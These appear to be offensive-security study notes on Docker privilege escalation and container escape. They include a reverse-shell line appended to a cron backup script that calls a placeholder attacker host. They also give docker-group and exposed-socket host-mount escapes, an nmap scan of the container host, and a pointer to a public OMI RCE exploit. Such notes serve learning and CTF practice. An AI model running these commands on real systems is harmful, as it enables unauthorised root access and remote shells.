## Understand how docker works

Go to the [Intro to Docker 🐳](/notes/Info/intro_to_docker.md) note.

## .dockerenv
- If we find a `.dockerenv` file in the root directory, we are running inside a docker container

- If we find a `.sh` on the `/opt/backups` directory like a backup script that might be running a cron job, we can try to write a reverse shell to it:

```shell
echo "bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1" >> backup.sh
```

## Being part of the docker group

- If we find out that our victim user belongs to the docker group, we can do the following (based on [GTFObins](https://gtfobins.github.io/gtfobins/docker/)):

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Escaping a container

- Once we are root by exploiting a capability vulnerability as example, we have to pivot to the host of the container as follows:

- Check environment variables for misconfigurations with `printenv`
- Run `ifconfig` to see if we are connected to the eth0
- Run `arp -a` to discover other hosts on the network

```shell
ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1) at 02:42:d2:ff:62:fe [ether] on eth0
```

- So now we know that `172.17.0.1` is our host
- Now we want to perform an nmap scan to it, so we will upload a [nmap binary](https://nmap.org/download.html#linux-rpm)
	- Download the source code one
	- Install with the following:

```shell
bzip2 -cd nmap-7.94.tar.bz2 | tar xvf -
cd nmap-7.94
./configure
make
su root
make install
```

- If you haver dependency errors try [this nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
	- With this one just upload it to the container and the add it execution permissions

- Now run:

```shell
./nmap -Pn -T4 -p- 172.17.0.1 --min-rate 5000 -vv

Host is up, received arp-response (-0.0014s latency).

- The port 5986 is for Microsoft's [Open Management Infraestructure (OMI)](https://github.com/microsoft/omi) service for remote configuration management of *nix VMs in Azure. Our host must be a simulation of an Azure Linux VM.
- There is a [CVE for an unauthenticated RCE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647), and a [public exploit](https://github.com/AlteredSecurity/CVE-2021-38647) for OMI we can test.
	- You can check the exploitation in this notes in [CVE-2021-38647](/notes/Exploits/CVE-2021-38647.md)

## Unprotected TCP socket (port 2375, 2376)

Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container and use chroot to escape the container-jail.

```shell
#PoC
docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```

## Search for docker containers (on the Host machine)

We can employ **findmnt** to display the mounts connected to the system, including those used by Docker containers:

```shell
findmnt
```
